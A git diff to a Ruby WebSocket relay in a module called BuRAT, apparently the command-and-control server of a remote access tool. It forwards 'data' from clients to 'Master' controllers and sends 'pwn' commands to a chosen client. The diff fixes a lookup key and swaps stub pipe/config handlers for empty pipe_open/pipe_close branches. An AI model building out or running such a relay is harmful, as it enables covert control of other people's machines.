@@ -42,18 +42,16 @@ module BuRAT
               packet = packet("client", payload, "disconnected")
               masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
-            elsif header == "data" then     # data - send to master and pipe to self
+            elsif header == "data" then     # data - send to master and pipe
               packet = packet("data", payload, trailer)
               masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
             elsif header == "pwn" then      # pwn - send to other clients
               packet = packet("pwn", payload, trailer)
-              client = @clients.find { |client| client["id"] == payload["client.id"]}
+              client = @clients.find { |client| client["id"] == payload["client"]}
               client["ws"].send(packet)
-            elsif header == "pipe" then                   # pipe
-              pipe(payload)                               # soon...
-            elsif header == 'config' then                 # config
-              config(payload)                             # soon...
+            elsif header == "pipe_open" then
+            elsif header == "pipe_close" then
             end
           rescue
             #ws.send(event.data)
@@ -80,17 +78,6 @@ module BuRAT
     end
 
     private
-    #pipe
-    def pipe(payload)
-      p payload
-    end
-
-    #config
-    def config(payload)
-      p payload
-    end
-
-    #packet
     def packet(header, payload, trailer)
       {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
     end
